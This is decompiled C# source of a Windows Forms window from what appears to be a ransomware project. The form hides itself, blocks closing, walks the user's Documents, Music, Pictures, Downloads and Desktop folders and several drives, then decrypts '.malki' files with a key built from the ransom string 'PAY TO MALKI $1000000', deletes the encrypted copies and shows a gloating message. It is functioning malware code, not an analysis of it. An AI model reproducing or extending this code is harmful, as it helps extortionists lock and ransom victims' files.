using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DiazProject.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;

namespace DiazProject;

[DesignerGenerated]
public class Form3 : Form
{
	private IContainer components;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("ProgressBar2")]
	private ProgressBar _ProgressBar2;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar2
	{
		get
		{
			return _ProgressBar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar2 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label4
	{
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Label Label5
	{
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	public Form3()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form3_FormClosing));
		((Form)this).add_Load((EventHandler)Form3_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		components = new Container();
		ListBox1 = new ListBox();
		ProgressBar1 = new ProgressBar();
		ProgressBar2 = new ProgressBar();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		Label5 = new Label();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		Point location = new Point(0, 0);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		Size size = new Size(120, 95);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(0);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(8, 8);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(100, 23);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(1);
		ProgressBar progressBar3 = ProgressBar2;
		location = new Point(16, 16);
		((Control)progressBar3).set_Location(location);
		((Control)ProgressBar2).set_Name("ProgressBar2");
		ProgressBar progressBar4 = ProgressBar2;
		size = new Size(100, 23);
		((Control)progressBar4).set_Size(size);
		((Control)ProgressBar2).set_TabIndex(2);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(0, 0);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(3);
		Label1.set_Text("Label1");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(0, 0);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(39, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(4);
		Label2.set_Text("Label2");
		Label3.set_AutoSize(true);
		Label label5 = Label3;
		location = new Point(8, 8);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(39, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(5);
		Label3.set_Text("Label3");
		Label4.set_AutoSize(true);
		Label label7 = Label4;
		location = new Point(16, 16);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(39, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(6);
		Label4.set_Text("Label4");
		Label5.set_AutoSize(true);
		Label label9 = Label5;
		location = new Point(24, 24);
		((Control)label9).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label10 = Label5;
		size = new Size(39, 13);
		((Control)label10).set_Size(size);
		((Control)Label5).set_TabIndex(7);
		Label5.set_Text("Label5");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(425, 273);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar2);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).set_Name("Form3");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form3");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form3_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Form3_Load(object sender, EventArgs e)
	{
		//Discarded unreachable code: IL_00ca, IL_0146, IL_0207, IL_0287, IL_0348, IL_03c8, IL_0489, IL_0509, IL_05ca, IL_064a, IL_06fc, IL_076d, IL_081f, IL_0890, IL_0942, IL_09b3, IL_0a65, IL_0ad6, IL_0b88, IL_0bf9
		Process.Start("C:\\Windows\\explorer.exe");
		((Control)this).Hide();
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).set_ShowInTaskbar(false);
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments(), (SearchOption)2, new string[0]))
			{
				foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
				{
					if (!file.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file);
					}
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments()))
			{
				if (!file2.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file2);
				}
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic(), (SearchOption)2, new string[0]))
			{
				foreach (string file3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory2))
				{
					if (!file3.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file3);
					}
				}
			}
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic()))
			{
				if (!file4.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file4);
				}
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures(), (SearchOption)2, new string[0]))
			{
				foreach (string file5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory3))
				{
					if (!file5.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file5);
					}
				}
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures()))
			{
				if (!file6.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file6);
				}
			}
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Users\\" + Environment.UserName + "\\Downloads", (SearchOption)2, new string[0]))
			{
				foreach (string file7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory4))
				{
					if (!file7.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file7);
					}
				}
			}
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13);
			Exception ex14 = ex13;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Users\\" + Environment.UserName + "\\Downloads"))
			{
				if (!file8.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file8);
				}
			}
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15);
			Exception ex16 = ex15;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\Users\\" + Environment.UserName + "\\Desktop", (SearchOption)2, new string[0]))
			{
				foreach (string file9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory5))
				{
					if (!file9.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file9);
					}
				}
			}
		}
		catch (Exception ex17)
		{
			ProjectData.SetProjectError(ex17);
			Exception ex18 = ex17;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:\\Users\\" + Environment.UserName + "\\Desktop"))
			{
				if (!file10.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file10);
				}
			}
		}
		catch (Exception ex19)
		{
			ProjectData.SetProjectError(ex19);
			Exception ex20 = ex19;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("D:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file11 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory6))
				{
					if (!file11.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file11);
					}
				}
			}
		}
		catch (Exception ex21)
		{
			ProjectData.SetProjectError(ex21);
			Exception ex22 = ex21;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file12 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("D:\\"))
			{
				if (!file12.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file12);
				}
			}
		}
		catch (Exception ex23)
		{
			ProjectData.SetProjectError(ex23);
			Exception ex24 = ex23;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("E:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file13 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory7))
				{
					if (!file13.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file13);
					}
				}
			}
		}
		catch (Exception ex25)
		{
			ProjectData.SetProjectError(ex25);
			Exception ex26 = ex25;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file14 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("E:\\"))
			{
				if (!file14.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file14);
				}
			}
		}
		catch (Exception ex27)
		{
			ProjectData.SetProjectError(ex27);
			Exception ex28 = ex27;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("A:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file15 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory8))
				{
					if (!file15.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file15);
					}
				}
			}
		}
		catch (Exception ex29)
		{
			ProjectData.SetProjectError(ex29);
			Exception ex30 = ex29;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file16 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("A:\\"))
			{
				if (!file16.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file16);
				}
			}
		}
		catch (Exception ex31)
		{
			ProjectData.SetProjectError(ex31);
			Exception ex32 = ex31;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Z:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file17 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory9))
				{
					if (!file17.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file17);
					}
				}
			}
		}
		catch (Exception ex33)
		{
			ProjectData.SetProjectError(ex33);
			Exception ex34 = ex33;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file18 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("Z:\\"))
			{
				if (!file18.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file18);
				}
			}
		}
		catch (Exception ex35)
		{
			ProjectData.SetProjectError(ex35);
			Exception ex36 = ex35;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("X:\\", (SearchOption)2, new string[0]))
			{
				foreach (string file19 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory10))
				{
					if (!file19.EndsWith("desktop.ini"))
					{
						ListBox1.get_Items().Add((object)file19);
					}
				}
			}
		}
		catch (Exception ex37)
		{
			ProjectData.SetProjectError(ex37);
			Exception ex38 = ex37;
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file20 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("X:\\"))
			{
				if (!file20.EndsWith("desktop.ini"))
				{
					ListBox1.get_Items().Add((object)file20);
				}
			}
		}
		catch (Exception ex39)
		{
			ProjectData.SetProjectError(ex39);
			Exception ex40 = ex39;
			ProjectData.ClearProjectError();
		}
		Timer1.Start();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		ProgressBar2.set_Value(25);
		ProgressBar1.set_Maximum(ListBox1.get_Items().get_Count());
		if (ProgressBar1.get_Value() == ListBox1.get_Items().get_Count())
		{
			Timer1.Stop();
			Interaction.MsgBox((object)"Malki is so happy! Now All Of Your Files Are Decrypted!", (MsgBoxStyle)64, (object)"AslaHora");
			Application.ExitThread();
			return;
		}
		ListBox1.set_SelectedIndex(ProgressBar1.get_Value());
		ListBox1.set_SelectionMode((SelectionMode)1);
		string text = Conversions.ToString(ListBox1.get_SelectedItem());
		ProgressBar2.set_Value(50);
		try
		{
			byte[] bytKey = MyProject.Forms.Form1.CreateKey("PAY TO MALKI $1000000");
			byte[] bytIV = MyProject.Forms.Form1.CreateIV("PAY TO MALKI $1000000");
			string text2 = "Books and Chapters and Pages";
			string strOutputFile = Strings.Replace(text, ".malki", "", 1, -1, (CompareMethod)0);
			MyProject.Forms.Form1.EncryptOrDecryptFile(text, strOutputFile, bytKey, bytIV, Form1.CryptoAction.ActionDecrypt);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		ProgressBar2.set_Value(0);
		ProgressBar1.Increment(1);
		Label5.set_Text(text);
	}
}
